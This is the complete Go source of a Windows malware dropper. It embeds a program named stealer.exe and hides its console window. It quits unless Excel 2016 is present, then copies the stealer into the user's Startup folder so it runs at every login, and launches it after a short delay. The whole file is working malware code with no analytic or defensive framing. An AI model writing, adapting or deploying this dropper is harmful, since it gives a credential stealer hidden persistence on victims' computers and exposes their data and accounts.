//go build -ldflags "-H=windowsgui"
package main

import (
	"embed"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

//go:embed stealer.exe
var embeddedFiles embed.FS

func check() {
	// check installed execl2016
	excel_path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
	if _, err := os.Stat(excel_path); os.IsNotExist(err) {
		os.Exit(1)
	}
}

func hidden() []byte {
	// embed stealer.exe into dropper.exe
	data, err := embeddedFiles.ReadFile("stealer.exe")
	if err != nil {
		return nil
	}
	return data
}

func drop(data []byte) string {
	// output stealer.exe to startup folder
	appdata := os.Getenv("APPDATA")
	startup := filepath.Join(appdata, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.exe")

	err := os.WriteFile(startup, data, 0755)
	if err != nil {
		return ""
	}
	return startup
}

func main() {
	check()

	data := hidden()

	path := drop(data)

	// exec stealer.exe
	time.Sleep(5 * time.Second)
	cmd := exec.Command(path)
	cmd.Start()
}
